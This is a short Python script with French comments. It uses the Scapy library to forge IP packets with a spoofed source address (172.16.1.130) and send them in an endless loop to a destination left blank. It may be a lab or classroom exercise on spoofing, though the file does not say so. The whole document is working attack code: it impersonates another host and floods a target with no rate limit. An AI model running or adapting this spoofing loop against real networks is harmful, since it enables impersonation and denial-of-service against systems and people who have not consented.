from scapy.all import *
import time

def ip_spoofing(ip_target, dst_ip):
    attack_packet = Ether() / IP(src=ip_target, dst=dst_ip)
    return attack_packet

try:
    while True:
        src_ip="172.16.1.130" # usurpation de l'IP
        dst_ip="" # destination de l'envoi
        sendp(ip_spoofing(src_ip, dst_ip))
        # time.sleep(0.1)
except KeyboardInterrupt:
    quit()